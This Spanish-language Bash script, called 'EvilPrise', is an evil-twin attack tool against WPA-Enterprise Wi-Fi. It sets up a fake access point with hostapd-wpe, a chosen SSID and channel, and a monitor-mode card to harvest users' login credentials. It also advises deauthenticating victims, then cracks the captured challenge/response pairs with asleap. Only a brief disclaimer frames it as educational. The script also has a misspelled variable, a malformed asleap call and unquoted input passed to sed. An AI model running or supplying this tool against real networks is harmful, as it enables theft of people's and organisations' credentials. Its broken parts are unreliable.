#!/bin/bash


clear
figlet "Disclaimer"
echo ""
echo "Todo uso de esta herramienta con fines mal intencionados, no relacionados con la educacion, la practica"
echo "segura en entornos controlados, o el pentesting o auditoría de redes inalámbricas"
echo ""
echo "No me hago responsable ante cualquier percance judicial, juridico o institucional ni nada de lo anteriormente mencionado"
echo ""
echo "Hecho por g0dsp, para toda la gente entusiasta del hacking y profesionales de este."
sleep 8

clear

#Setup
figlet "Bienvenido al setup de EvilPrise"
echo "https://github.com/G0dsp"
echo ""
echo "The dead thing is beyond us..."
echo ""

#Comprobacion de permisos de superusuario
if ! [ $(id -u) = 0 ];
 then 
 echo ""
echo "                          No eres root, prueba a poner sudo antes de iniciar la herramienta" 
exit 1 
fi

echo ""
sleep 2
clear
echo "Se recomienda usar un ataque de deautenticacion para llevar"
echo "acabo una mejor recoleccion de credenciales (a la red que estes suplantando)"
echo ""
sleep 3
clear
echo "                          Vamos a comprobar si los paquetes adecuados estan instalados"
echo ""

#Rutas de archivos y directorios una vez ya instalados, o por instalar
wpe=/etc/hostapd-wpe
asl=/usr/bin/asleap

#Comrpobando si estan instalados o no
if [ -d "$wpe" ]
then 
echo "          [✓]Hostapd-wpe instalado"
sleep 0.5
else
echo "          [x]Hostapd-wpe no instalado"
echo "          Procedemos a instalarlo"

sleep 1

apt-get install hostapd-wpe

fi

if [ -f "$asl" ]
then 
echo "          [✓]Asleap instalado"
else
echo "          [x]Asleap no instalado"
echo "          Procedemos a instalarlo"
sleep 1
apt-get install asleap
fi

sleep 2

clear
figlet "EvilPrise"
echo ""
echo "      ¿Que quieres hacer hoy?"
echo ""
echo "[1*]   Conseguir credenciales"
echo "[2*]   Crackear credenciales ya conseguidas"
echo ""
read -r options

case $options in
1) 

clear
figlet "EvilPrise"
echo ""
echo "                      Vamos a cambiar el ssid predefinido!"
echo ""
echo "Como te gustaria llamarlo? (sin espacios a ser posible)"
read -r ssid
#Modificacion de un campo de texto en una archivo de configuracion
sed -i 's/^ssid=.*/ssid='$ssid'/g' /etc/hostapd-wpe/hostapd-wpe.conf
echo ""

echo "                      Vamos a cambiar el canal predefinido!"
echo ""
echo "¿Qué canal te gustaria utilizar? (1-12)"
read -r canal
#Modificacion de un campo de texto en una archivo de configuracion
sed -i 's/^channel=.*/channel='$canal'/g' /etc/hostapd-wpe/hostapd-wpe.conf
echo ""

echo ""
echo "                      ¡Vamos a ver si tienes alguna tarjeta para realizar el ataque!"
echo ""
iwconfig
echo "¿Qué interfaz te gustaria usar?"
read -r wifi
echo ""
airmon-ng start $wifi

echo ""
figlet "Guardando configs"

sleep 2

clear
#Buscar txt para guardar credenciales
enterprise=$(find / -name credentials-nc.txt)
figlet "Realizando el ataque de captura pasiva"
figlet "Enterprise Wifi"
echo ""
echo "Este ataque es pasivo, dejelo tanto como quiera para capturar la mayoria"
echo "de contraseñas de Enterprise"
#Guardando credenciales para crackeo
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf -i $wifi >> $enterprise

echo "Todas las credenciales capturadas se han guardado en credentials-nc.txt o en hostapd-wpe.log"
;;
2)
clear
figlet "EvilPrise cracking"
echo ""
sleep 2
clear
echo "Ten listo el archivo .log o el .txt ya mencionados"
echo ""
echo "Challengue de la credencial a crackear"
read -r reto
echo ""
echo "Response de la credencial a crackear"
read -r response
echo ""
echo "Por último una ruta para el diccionario"
read -r ruta
clear
figlet "Crackeando credencial..."
asleap $reto $respomse $ruta
echo "Felicidades credencial crackeada, a no ser que seas bobo y hayas puesto algo mal"
;;

esac
